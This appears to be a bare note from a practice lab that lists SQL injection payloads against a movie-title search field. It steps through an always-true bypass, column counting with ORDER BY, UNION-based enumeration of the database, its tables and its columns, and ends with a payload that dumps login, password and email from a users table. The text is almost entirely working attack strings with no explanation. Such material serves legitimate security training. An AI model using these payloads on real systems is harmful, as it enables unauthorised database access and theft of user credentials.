select * from movies where title='' -- ';

TITLE = INJECTION

' or 1=1 -- 
' union select 1  -- 
' order by 20  --
' order by 7  --  
' union select 1,2,3,4,5,6,7  --
' union select 1,database(),3,4,5,6,7  --  
' union select 1,group_concat(table_name),3,4,5,6,7 from information_schema.tables -- 
' union select 1,group_concat(table_name),3,4,5,6,7 from information_schema.tables where table_schema=database() -- 
' union select 1,group_concat(column_name),3,4,5,6,7 from information_schema.columns where table_schema=database() and table_name='users' -- 
' union select 1,group_concat(login,0x3a,password,0x3a,email,0x0a),3,4,5,6,7 from users -- 
